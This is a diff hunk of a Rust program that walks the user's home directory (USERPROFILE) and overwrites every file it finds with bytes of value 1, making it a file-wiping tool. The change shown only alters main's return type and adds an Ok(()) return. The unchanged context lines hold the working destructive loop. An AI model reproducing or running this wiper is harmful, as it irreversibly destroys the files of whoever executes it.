@@ -2,7 +2,7 @@ use std::env;
 use walkdir::WalkDir;
 use std::fs;
 
-fn main() {
+fn main() -> std::io::Result<()> {
     let home_path = env::var_os("USERPROFILE").unwrap(); // HOME for Linux; USERPROFILE for Windows
     
     const OVERWRITE_DATA: u8 = 1;
@@ -19,4 +19,5 @@ fn main() {
                 fs::write(the_actual_file, vec![OVERWRITE_DATA; file_size]).expect("Something went wrong while over-writing the file!");
             }
         }
+        Ok(())
 }
